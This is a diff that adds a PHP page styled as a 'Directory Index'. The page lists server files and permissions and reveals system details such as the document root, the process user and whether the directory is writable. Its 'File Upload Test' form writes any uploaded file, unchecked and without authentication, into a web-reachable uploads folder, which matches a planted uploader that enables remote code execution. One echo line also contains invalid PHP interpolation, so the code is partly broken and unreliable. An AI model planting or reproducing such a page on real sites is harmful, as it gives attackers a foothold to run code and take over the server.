@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Directory Index</title>
+    <style>
+        body { font-family: 'Courier New', monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        h1 { color: #00ff41; border-bottom: 2px solid #00ff41; padding-bottom: 10px; }
+        .info-box { background: #0d1b2a; padding: 15px; border-left: 4px solid #00ff41; margin: 20px 0; }
+        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
+        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
+        th { background: #16213e; color: #00ff41; }
+        .file { color: #ff6b35; }
+        .dir { color: #4ecdc4; font-weight: bold; }
+        .size { color: #95a5a6; font-size: 0.9em; }
+        pre { background: #0f3460; padding: 15px; border-radius: 5px; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📁 Directory Index</h1>
+        
+        <div class="info-box">
+            <strong>✅ Index file loaded successfully</strong><br>
+            Path: <code id="current-path"></code><br>
+            Server: <code id="server-info"></code><br>
+            PHP: <code id="php-version"><?php echo phpversion() ?? 'Not available'; ?></code>
+        </div>
+
+        <!-- Directory listing -->
+        <h2>📋 Files & Directories</h2>
+        <table id="dir-table">
+            <thead>
+                <tr>
+                    <th>Name</th>
+                    <th>Size</th>
+                    <th>Modified</th>
+                    <th>Permissions</th>
+                </tr>
+            </thead>
+            <tbody>
+                <?php
+                if (function_exists('scandir')) {
+                    $files = scandir('.');
+                    $dirs = [];
+                    $files_list = [];
+                    
+                    foreach ($files as $file) {
+                        if ($file == '.' || $file == '..') continue;
+                        
+                        $path = './' . $file;
+                        $is_dir = is_dir($path);
+                        $size = $is_dir ? '-' : filesize($path);
+                        $mod_time = date('Y-m-d H:i', filemtime($path));
+                        $perms = substr(sprintf('%o', fileperms($path)), -4);
+                        
+                        if ($is_dir) {
+                            $dirs[] = $file;
+                        } else {
+                            $files_list[] = $file;
+                        }
+                    }
+                    
+                    // Sort dirs first, then files
+                    foreach (array_merge($dirs, $files_list) as $item) {
+                        $path = './' . $item;
+                        $is_dir = is_dir($path);
+                        $size = $is_dir ? '-' : number_format(filesize($path) / 1024, 1) . ' KB';
+                        $mod_time = date('Y-m-d H:i:s', filemtime($path));
+                        $perms = substr(sprintf('%o', fileperms($path)), -4);
+                        $icon = $is_dir ? '📁' : '📄';
+                        
+                        echo "<tr>";
+                        echo "<td><a href='$path' class='{$is_dir ? 'dir' : 'file'}'>$icon $item</a></td>";
+                        echo "<td class='size'>$size</td>";
+                        echo "<td>$mod_time</td>";
+                        echo "<td>$perms</td>";
+                        echo "</tr>";
+                    }
+                } else {
+                    echo "<tr><td colspan='4'>Directory listing disabled</td></tr>";
+                }
+                ?>
+            </tbody>
+        </table>
+
+        <!-- System info -->
+        <h2>💻 System Information</h2>
+        <div class="info-box">
+            <pre id="sys-info"><?php
+                echo "Document Root: " . ($_SERVER['DOCUMENT_ROOT'] ?? 'N/A') . "\n";
+                echo "Current Dir: " . getcwd() . "\n";
+                echo "User: " . get_current_user() . "\n";
+                echo "Writable: " . (is_writable('.') ? '✅ YES' : '❌ NO') . "\n";
+                echo "PHP Functions: " . (function_exists('scandir') ? '✅ Enabled' : '❌ Disabled') . "\n";
+            ?></pre>
+        </div>
+
+        <!-- Upload test form -->
+        <h2>⬆️ File Upload Test</h2>
+        <form method="POST" enctype="multipart/form-data" style="background: #16213e; padding: 20px; border-radius: 5px;">
+            <input type="file" name="upload_file" required>
+            <input type="submit" value="Upload & List" style="background: #00ff41; color: black; padding: 10px 20px; border: none; cursor: pointer;">
+        </form>
+
+        <?php
+        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
+            $upload_dir = './uploads/';
+            if (!is_dir($upload_dir)) mkdir($upload_dir, 0755, true);
+            
+            $file = $_FILES['upload_file'];
+            $target = $upload_dir . basename($file['name']);
+            
+            if (move_uploaded_file($file['tmp_name'], $target)) {
+                echo "<div class='info-box'><strong>✅ File uploaded:</strong> <code>$target</code></div>";
+            } else {
+                echo "<div class='info-box' style='border-left-color: #ff4757;'><strong>❌ Upload failed</strong></div>";
+            }
+        }
+        ?>
+
+        <script>
+            // Set dynamic info
+            document.getElementById('current-path').textContent = window.location.pathname;
+            document.getElementById('server-info').textContent = navigator.userAgent.split(' ').pop();
+        </script>
+    </div>
+</body>
+</html>
